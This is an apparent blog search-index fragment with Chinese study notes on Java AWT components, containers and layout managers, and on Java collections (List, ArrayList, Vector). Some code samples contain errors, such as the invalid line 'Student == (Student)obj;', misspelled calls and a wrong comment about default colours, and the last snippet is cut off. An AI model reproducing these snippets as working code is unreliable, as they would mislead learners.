      <link href="/2022/01/20/GUI%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/01/20/GUI%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<center><h1>GUI</h1></center><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li><p>为图形用户界面，是指采用图形方式显示的计算机操作用户界面，是计算机与其使用者之间的对话接口，是计算机系统的重要组成部分。</p></li><li><p>早期，电脑向用户提供的是单调、枯燥、纯字符状态的“命令行界面（CLI）”，也有人称之为字符用户界面（CUI）</p></li><li><p>由于字符用户界面的操作方式需要用户死记硬背大量的命令，这对于普通用户而言非常不便。后来取而代之的是可以通过窗口、菜单、按键等方式来方便地进行操作。</p></li><li><p>70年代，施乐公司 Xerox Palo Alto Research Center (PARC) 的研究人员开发了第一个 GUI 图形用户界面，开启了计算机图形界面的新纪元。这之后，操作系统的界面设计经历了众多变迁，OS/2, Macintosh, Windows, Linux, Mac OS, Symbian OS, Android, IOS各种操作系统将 GUI 设计带进新的时代。</p><hr></li></ul><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>Gui的核心技术: <code>Swing AWT</code></p><ol><li>因为界面不美观</li><li>运行需要jre运行环境</li></ol><ul><li><p>学习这个可以写出我们心中的一些小工具</p></li><li><p>了解MVC架构，了解监听</p></li></ul><h1 id="AWT"><a href="#AWT" class="headerlink" title="AWT"></a>AWT</h1><h2 id="Awt介绍"><a href="#Awt介绍" class="headerlink" title="Awt介绍"></a>Awt介绍</h2><p>架构图</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201201227405.png"></p><p>java.awt包提供了基本的java程序的<a href="https://baike.baidu.com/item/GUI">GUI</a>设计工具。主要包括下述三个概念：</p><ul><li><a href="https://baike.baidu.com/item/%E7%BB%84%E4%BB%B6">组件</a>–Component</li><li><a href="https://baike.baidu.com/item/%E5%AE%B9%E5%99%A8">容器</a>–Container</li><li>布局管理器–LayoutManager</li></ul><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>组件(Conponent)是<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BD%A2%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2/3352324">图形用户界面</a>最基本的部分，也称为<a href="https://baike.baidu.com/item/%E6%9E%84%E4%BB%B6">构件</a>，是可以以图形化的方式显示在屏幕上，并能与用户进行交互的对象，例如一个按钮，一个标签等。组件不能独立地显示出来，必须将其放在一定的容器中才可以显示。 类java.awt.Component是许多组件类的父类，Component类中封装了组件通用的方法和属性，如图形的组件对象、大小、显示位置、前景色和背景色、边界、可见性等。</p><h2 id="AWT常用组件"><a href="#AWT常用组件" class="headerlink" title="AWT常用组件"></a>AWT常用组件</h2><table><thead><tr><th>组件名称</th><th>构造方法</th><th>使用说明</th></tr></thead><tbody><tr><td>按钮(Button)</td><td>Button b=new Button(“退出”);</td><td>单击按钮产生ActionEvent事件，实现ActionListener接口并重写actionPerformed()方法监听和处理事件</td></tr><tr><td>复选框(Checkbox)</td><td>Checkbox ch=new Checkbox(“one”,true);</td><td>选中复选框产生ItemAction事件，实现ItemListener接口监听和处理事件</td></tr><tr><td>下拉菜单(Choice)</td><td>Choice colorChoose=new Choice();</td><td>实现ItemListener接口监听和处理事件；Add()方法可在下拉列表中添加选项</td></tr><tr><td>画布(Canvas)</td><td>public Canvas(GraphicsConfigurationconfig);</td><td>重写Canvas类的paint()方法实现完成图形处理；实现MouseListener和KeyListener接口监听Canvas组件的鼠标和键盘事件</td></tr><tr><td>文本框(TextField)</td><td>TextField ft=new TextField(16);//宽度为16个字符</td><td>文本框只能显示一行，按Enter键时产生ActionEvent事件，通过ActionListener接口中的actionPerformed()方法处理事件</td></tr><tr><td>文本域(TextAera)</td><td>TextArea ta=new TextArea(“Textarea”,4,10);//4行10列</td><td>可显示多行多列文本和滚动条</td></tr><tr><td>列表框(List)</td><td>List list=new List(4,false);//4行，不允许多选</td><td>提供多个文本选项，支持滚动条，可以浏览多项</td></tr><tr><td>对话框(Dialog)</td><td></td><td>Window类的子类</td></tr><tr><td>文件对话框(FileDialog)</td><td>Filedialog fd=new Filedialog(frm,”fileddilog”);</td><td>当用户想打开或存储文件时，可使用文件对话框进行操作</td></tr><tr><td>菜单栏(MenuBar)</td><td>MenuBar mb=new MenuBar();</td><td>通过frm.setMenuBar(mb)语句可将菜单mb设置为Frame对象frm的主菜单</td></tr><tr><td>下拉菜单(Menu)</td><td>Menu m=new Menu(“Menu”);</td><td>通过mb.add(m)可将m下拉列表添加到菜单栏中</td></tr><tr><td>菜单项(MenuItem)</td><td>MenuItem mi=new MenuItem(“Openit”);</td><td>通过mi.add(mi)将菜单项mi添加到下一个下拉列表m中。</td></tr><tr><td>颜色(Color)</td><td>//非构造方法，两种方法设置组件背景色setBackground(Color.BLUE);setBackground(newColor(100,100,100));</td><td>通过setForeground()方法设置组件前景色，通过setBackground()方法设置组件背景色。颜色值可使用Color类的颜色常量来设置，也可通过指定RGB颜色对象值设置</td></tr><tr><td>字体(Font)</td><td>Font font=new Font(“宋体”,Font.BOLD,10);//宋体，10号，加粗</td><td>按顺序向Font()构造方法传递有关字体设置的参数</td></tr></tbody></table><hr><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p><a href="https://baike.baidu.com/item/%E5%AE%B9%E5%99%A8/2797468">容器</a>(Container)也是一个类，实际上是Component的子类，因此<a href="https://baike.baidu.com/item/%E5%AE%B9%E5%99%A8/2797468">容器</a>本身也是一个组件，具有组件的所有性质，但是它的主要功能是容纳其它组件和容器。容器可以简化图形化界面的设计，以整体结构来布置界面。所有的容器都可以通过add()方法向容器中添加组件。常用的容器3种：Panel, Frame, Applet。</p><h3 id="框架-Frame"><a href="#框架-Frame" class="headerlink" title="框架(Frame)"></a><a href="https://baike.baidu.com/item/%E6%A1%86%E6%9E%B6">框架</a>(Frame)</h3><p><a href="https://baike.baidu.com/item/%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95">构造方法</a>：</p><p><code>Frame frm = </code>new<code> </code>Frame(<code>&quot;New Window&quot;</code>);</p><p>要生成一个窗口，通常使用Window的子类Frame类进行实例化，而不是直接使用Window 类，框架的外观就像平常Windows系统下的窗口，有标题、<a href="https://baike.baidu.com/item/%E8%BE%B9%E6%A1%86">边框</a>、<a href="https://baike.baidu.com/item/%E8%8F%9C%E5%8D%95">菜单</a>和大小等。setSize()方法可以设置框架尺寸的大小，setVisibe()方法可以设置窗口的可见性。</p><h3 id="面板-Panel"><a href="#面板-Panel" class="headerlink" title="面板(Panel)"></a><a href="https://baike.baidu.com/item/%E9%9D%A2%E6%9D%BF">面板</a>(Panel)</h3><p>构造方法：</p><p><code>Panel pnl = ``new</code> <code>Panel();</code></p><p>面板是一种透明的容器，没有标题和边框。与Frame 不同，Panel不能作为最外层的容器单独存在，它首先必须作为一个组件放置在其他容器（一般为Frame）中，然后把组件添加到它里面。在java.swing中则是<a href="https://baike.baidu.com/item/JPanel">JPanel</a>。</p><h3 id="小程序-Applet"><a href="#小程序-Applet" class="headerlink" title="小程序(Applet)"></a><a href="https://baike.baidu.com/item/%E5%B0%8F%E7%A8%8B%E5%BA%8F/20056403">小程序</a>(<a href="https://baike.baidu.com/item/Applet">Applet</a>)</h3><p>构造方法：</p><p><code>Applet apt = </code>new<code> </code>Applet();</p><p>框架一般用作Java应用程序的窗口，而Applet是Java小程序的窗口。与Frame不同，Applet是在网页中显示的，也可以通过添加Panel进行组件布局。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContainerComponent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个frame框架</span></span><br><span class="line">        Frame frame=<span class="keyword">new</span> Frame();</span><br><span class="line">        <span class="comment">//设置Java窗体组件的名称</span></span><br><span class="line">        frame.setTitle(<span class="string">&quot;JavaGUIComponent&quot;</span>);</span><br><span class="line">        <span class="comment">//设置窗体的顶点位置及其大小</span></span><br><span class="line">        frame.setBounds(<span class="number">20</span>,<span class="number">30</span>,<span class="number">300</span>,<span class="number">280</span>);</span><br><span class="line">        <span class="comment">//设置窗体是否可见</span></span><br><span class="line">        frame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//设置窗体背景颜色</span></span><br><span class="line">        frame.setBackground(Color.gray);</span><br><span class="line">        frame.add(<span class="keyword">new</span> List());</span><br><span class="line">        <span class="comment">/*给窗体添加监听器的方法改变窗体状态,监听器的参数是一个内部类，</span></span><br><span class="line"><span class="comment">         *     内部类定义了窗体关闭的处理方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        frame.addWindowListener(<span class="keyword">new</span> WindowAdapter() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowClosing</span><span class="params">(WindowEvent we)</span> </span>&#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//创建一个panel面板</span></span><br><span class="line">        Panel panel=<span class="keyword">new</span> Panel();</span><br><span class="line">        <span class="comment">//给panel面板添加文本框、文本域、列表、单选按钮、复选按钮、画布、标签、字体大小、事件、滚动条</span></span><br><span class="line">        panel.add(<span class="keyword">new</span> TextField(<span class="number">20</span>));</span><br><span class="line">        panel.add(<span class="keyword">new</span> Button(<span class="string">&quot;Click me!&quot;</span>));</span><br><span class="line">         </span><br><span class="line">        frame.add(panel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="布局管理器"><a href="#布局管理器" class="headerlink" title="布局管理器"></a>布局管理器</h2><p>布局管理器（LayoutManager）：每个容器都有一个布局管理器，当容器需要对某个组件进行定位或判断其大小、尺寸时，就会调用其对应的布局管理器。使用布局管理器可以实现跨平台的特性，并且获得动态的布局效果。布局管理器负责管理组件的排列顺序、大小和位置。不同的布局管理器使用不同的布局策略，容器可以通过选择不同的布局管理器来决定如何布局。</p><h4 id="流布局管理器FlowLayout"><a href="#流布局管理器FlowLayout" class="headerlink" title="流布局管理器FlowLayout"></a>流布局管理器FlowLayout</h4><p>FlowLayout是Panel 和 Applet 的默认布局管理器。在该布局管理器中，组件在容器中按照从上到下，从左到右的顺序进行排列，行满后则换行。</p><p>构造方法较多，例如：</p><ul><li>FlowLayout();默认构造方法，设置居中对齐方式，横向和纵向间隔均为默认5<a href="https://baike.baidu.com/item/%E5%83%8F%E7%B4%A0">像素</a></li><li>FlowLayout(FlowLayout.LEFT);设置居左对齐，横向和纵向间隔均为默认5像素</li><li>FlowLayout(FlowLayout.RIGHT,20,40);设置居右对齐，横向间隔20像素，纵向间隔40像</li></ul><h4 id="边边界布局管理器BorderLayout"><a href="#边边界布局管理器BorderLayout" class="headerlink" title="边边界布局管理器BorderLayout"></a>边边界布局管理器BorderLayout</h4><p>构造方法：</p><p><code>BorderLayout bl = ``new</code> <code>BorderLayout();</code></p><p>BorderLayout是Window、Frame和Dialog的默认布局管理器，其将容器分成North、South、East、West和Center 5个区域，每个区域只能放置一个组件。在使用add()方法添加组件到容器时，必须指定将其放置在哪个区域中。使用BorderLayout时，如果容器大小发生变换，组件的相对位置不变。</p><h4 id="网格布局管理器GridLayout"><a href="#网格布局管理器GridLayout" class="headerlink" title="网格布局管理器GridLayout"></a>网格布局管理器GridLayout</h4><p>构造方法：</p><p><code>GridLayout gl = </code>new<code> </code>GridLayout(<code>3</code>,<code>5</code>); ``//3行5列</p><p>GridLayout 可使容器中的各个组件呈网格状布局，平局占据容器的空间，即使容器的大小发生变化，每个组件还是平均占据容器的空间。和FlowLayout一样，GridLayout也是按照从上到下，从左到右的规律进行排列的。</p><h4 id="卡片布局管理器CardLayout"><a href="#卡片布局管理器CardLayout" class="headerlink" title="卡片布局管理器CardLayout"></a>卡片布局管理器CardLayout</h4><p>构造方法：</p><p><code>CardLayout cl = </code>new<code> </code>CardLayout();</p><p>CardLayout能够帮助用户处理两个乃至跟多的成员共享同一显示空间。它把容器分成许多层，每层的显示空间占据整个容器的大小，并且每层之允许反之一个组件，可以通过Panel来实现每层复杂的用户界面。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>使用Frame的例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">Frame</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[ ])</span></span>&#123;</span><br><span class="line">MyFrame fr = <span class="keyword">new</span> MyFrame(<span class="string">&quot;Hello Out There!&quot;</span>);</span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line">fr.setSize(<span class="number">200</span>,<span class="number">200</span>);</span><br><span class="line"><span class="comment">//设置Frame的大小，缺省为（0，0）</span></span><br><span class="line">fr.setBackground(Color.red);</span><br><span class="line"><span class="comment">//设置Frame的背景，缺省为红色</span></span><br><span class="line">fr.setVisible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//设置Frame为可见，缺省为不可见</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyFrame</span> <span class="params">(String str)</span></span>&#123;</span><br><span class="line"><span class="keyword">super</span>(str); <span class="comment">//调用父类的构造方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>以下是一个FlowLayout示例小程序代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.gan.awt;</span><br><span class="line"><span class="keyword">import</span> java.awt.Button;</span><br><span class="line"><span class="keyword">import</span> java.awt.Frame;</span><br><span class="line"><span class="keyword">import</span> java.awt.Panel;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLayoutManager</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建Frame对象</span></span><br><span class="line">Frame f = <span class="keyword">new</span> Frame();</span><br><span class="line"><span class="comment">// 创建panel容器</span></span><br><span class="line">Panel p = <span class="keyword">new</span> Panel();</span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;1&quot;</span>));<span class="comment">// 默认垂直居中，间距为5</span></span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;2&quot;</span>));</span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;3&quot;</span>));</span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;4&quot;</span>));</span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;5&quot;</span>));</span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;6&quot;</span>));</span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;7&quot;</span>));</span><br><span class="line">p.add(<span class="keyword">new</span> Button(<span class="string">&quot;8&quot;</span>));p.add(<span class="keyword">new</span> Button(<span class="string">&quot;9&quot;</span>));</span><br><span class="line">f.add(p);</span><br><span class="line"><span class="comment">// 设置Frame标题</span></span><br><span class="line">f.setTitle(<span class="string">&quot;我的第二个FlowLayoutManager程序&quot;</span>);</span><br><span class="line"><span class="comment">// 设置Frame尺寸,默认为(0,0) f.setSize(200, 200);</span></span><br><span class="line"><span class="comment">// 设置是否可见，默认为false</span></span><br><span class="line">f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201201240174.png"></p><h1 id="Swing"><a href="#Swing" class="headerlink" title="Swing"></a>Swing</h1>]]></content>
      
      
      <categories>
          
          <category> GUI编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GUI编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java集合框架</title>
      <link href="/2022/01/19/JAVA%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/"/>
      <url>/2022/01/19/JAVA%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<center><h1>集合框架</h1></center><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="什么是集合"><a href="#什么是集合" class="headerlink" title="什么是集合"></a>什么是集合</h2><p>集合指的是一种对象的容器，实现了对对象的操作。</p><h2 id="集合和数组的区别"><a href="#集合和数组的区别" class="headerlink" title="集合和数组的区别"></a>集合和数组的区别</h2><ol><li>数组的长度固定， 集合长度不固定。</li><li>数组可以存储基本类型和引用类型，集合只能存储引用类型。</li></ol><h1 id="Collection体系"><a href="#Collection体系" class="headerlink" title="Collection体系"></a>Collection体系</h1><p>集合框架的体系如下</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201191907165.png"></p><h2 id="Collection概念"><a href="#Collection概念" class="headerlink" title="Collection概念"></a>Collection概念</h2><ul><li><p>它是集合体系中最顶端的一个接口是所有集合体系的<code>根</code></p></li><li><p>它代表一组任意类型的对象、无序、无下标、不能重复。</p><p>创建集合类<code>Collection collection = new ArrayList();</code></p></li></ul><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol><li><p>添加元素<code>collection.add();</code></p></li><li><p>删除元素</p><p><code>collection.remove();</code></p><p><code>collection.clear();</code></p></li><li><p>遍历元素</p><ol><li><p>使用增强for循环</p><p><code>for(Object object : collection)&#123;&#125;</code></p></li><li><p>使用迭代器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/haNext(); 有没有下一个元素</span><br><span class="line"><span class="comment">//next(); 获取下一个元素</span></span><br><span class="line"><span class="comment">//remove(); 删除当前元素</span></span><br><span class="line">Iterator it = collection.iterator();</span><br><span class="line"><span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">  String object = (String)it.next(); <span class="comment">//强转</span></span><br><span class="line">  <span class="comment">// 可以使用it.remove(); 进行移除元素</span></span><br><span class="line">  <span class="comment">// collection.remove(); 不能用collection其他方法 会报并发修改异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>判断</p><ol><li><p>判断元素是否重复</p><p><code>collection.contains();</code>  </p></li><li><p>判断元素是否存在</p><p><code>collection.isEmpty();</code></p></li></ol></li></ol><hr><h1 id="List集合"><a href="#List集合" class="headerlink" title="List集合"></a>List集合</h1><h2 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h2><ul><li><p>List集合是Collection的子接口</p></li><li><p>特点: 有序、有下标、元素可重复</p></li></ul><p>创建集合对象<code>List list = new ArrayList&lt;&gt;();</code></p><h2 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="1-1添加元素"><a href="#1-1添加元素" class="headerlink" title="1.1添加元素"></a>1.1添加元素</h3><ol><li>添加元素 <code>list.add( );</code> 会对基本类型进行自动装箱</li></ol><h3 id="1-2删除元素"><a href="#1-2删除元素" class="headerlink" title="1.2删除元素"></a>1.2删除元素</h3><ol><li><p>删除元素 可以用索引 <code>list.remove(0)</code></p><p>当删除数字与索引矛盾时 对数字强转</p><p><code>list.remove((Object) 10)</code> 或 <code>list.remove(new Integer(10))</code></p></li></ol><h3 id="1-3遍历"><a href="#1-3遍历" class="headerlink" title="1.3遍历"></a>1.3遍历</h3><ol><li>使用for循环遍历</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lise.size(); i++)&#123;</span><br><span class="line">  sout(list.get(i)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2.使用增强for</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Object list: collection)&#123; &#125;</span><br></pre></td></tr></table></figure><p>​    3.使用迭代器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Iterator it = collection.iterator();</span><br><span class="line"><span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">  String object = (String)it.next(); <span class="comment">//强转</span></span><br><span class="line">  <span class="comment">// 可以使用it.remove(); 进行移除元素</span></span><br><span class="line">  <span class="comment">// collection.remove(); 不能用collection其他方法 会报并发修改异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    4.使用列表迭代器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ListIterator li = list.listIterator();</span><br><span class="line"><span class="keyword">while</span>(li.hasNext())&#123;</span><br><span class="line">  System.out.println(li.nextIndex() + <span class="string">&quot;:&quot;</span> + li.next()); <span class="comment">//从前往后遍历</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(li.hasPrevious())&#123;</span><br><span class="line">  System.out.println(li.previousIndex() + <span class="string">&quot;:&quot;</span> + li.previous()); <span class="comment">//从后往前遍历</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4获取索引"><a href="#1-4获取索引" class="headerlink" title="1.4获取索引"></a>1.4获取索引</h3><p>获取集合索引<code>list.indexof()</code></p><h3 id="1-5返回子集合"><a href="#1-5返回子集合" class="headerlink" title="1.5返回子集合"></a>1.5返回子集合</h3><p>返回子集合 <code>sublist(x, y);</code> 左闭右开</p><p><code>List subList = list.subList(1, 3);</code> 返回索引 1、2</p><hr><h1 id="List实现类"><a href="#List实现类" class="headerlink" title="List实现类"></a>List实现类</h1><ul><li><p>ArrayList</p><ul><li>数组结构实现，必须要连续空间，查询快、增删慢</li><li>jdk1.2版本，运行效率块、线程不安全</li></ul></li><li><p>Vector</p><ul><li>数组结构实现，查询快、增删慢</li><li>jdk1.0版本，运行</li></ul></li><li><p>LinkedList</p><ul><li>双向链表结构实现，无需连续空间，增删快，查询慢</li></ul></li></ul><hr><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><p>ArrayList是List接口的实现类</p><p>创建集合 <code>ArrayList arrayList = new ArrayList&lt;&gt;();</code></p><ol><li>添加元素 <code>arrayList.add();</code></li><li>删除元素 <code>arrayList.remove(new Student(&quot;name&quot;, 10));</code></li></ol><p>这里重写了 equals(this == obj) 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">  <span class="comment">//1 判断是不是同一个对象</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span> == obj)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//2 判断是否为空</span></span><br><span class="line">  <span class="keyword">if</span>(obj == <span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//3 判断是否是Student类型</span></span><br><span class="line">  <span class="keyword">if</span>(obj <span class="keyword">instanceof</span> Student)&#123;</span><br><span class="line">    Student == (Student)obj;</span><br><span class="line">    <span class="comment">//4 比较属性</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.name.equals(s.getName()) &amp;&amp; <span class="keyword">this</span>.age == s.getAge())&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//5 不满足条件返回false</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>遍历元素</p><ol><li><p>使用迭代器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Iterator it = arrayList.iterator();</span><br><span class="line">while(it.hasNext())&#123;</span><br><span class="line">  Student s = (Student)it.next(); //强转</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>列表迭代器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ListIterator li = arrayList.listIterator();</span><br><span class="line">while(li.hasNext())&#123;</span><br><span class="line">  Student s = (Student)li.next(); //从前往后遍历</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(li.hasPrevious())&#123;</span><br><span class="line">  Student s = (Student)li.previous();//从后往前遍历</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>判断</p><p><code>arrayList.contains();</code> 和 <code>arrayList.isEmpty();</code></p></li><li><p>查找</p><p><code>arrayList.indexof();</code></p></li></ol><p><strong>原码分析</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_CAPACITY = <span class="number">10</span>; <span class="comment">//默认容量</span></span><br><span class="line"><span class="comment">//注意：如果没有向集合中添加任何元素时，容量0，添加一个后，容量为10</span></span><br><span class="line"><span class="comment">//每次扩容是原来的1.5倍</span></span><br><span class="line">elementData存放元素的数组</span><br><span class="line">size 实际元素个数</span><br></pre></td></tr></table></figure><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><p>创建集合 <code>Vector vector = new Vector&lt;&gt;();</code></p><p>增加、删除、判断同上</p><p>遍历中枚举器遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Enumeration en = vector.elements();</span><br><span class="line"><span class="keyword">while</span>(en.hasMoreElements())&#123;</span><br><span class="line">  String o = (String)en.nextElement();</span><br><span class="line">  sout(o);</span><br><span 